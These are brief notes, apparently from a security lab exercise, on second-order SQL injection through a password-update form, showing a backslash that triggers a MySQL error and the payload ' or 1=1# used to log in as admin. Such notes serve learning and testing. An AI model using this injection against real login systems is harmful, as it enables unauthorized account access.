[SECOND ORDER INJECTIONS]
Update query -error based
by giving "\" in the update query entry an error in the mysql statement is triggered
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1"

username=admin
update password=' or 1=1#
no syntax error is created
when we use single quotes in new password no syntax error is generated.
update password:' or 1=1#
username:admin
successfully logged in
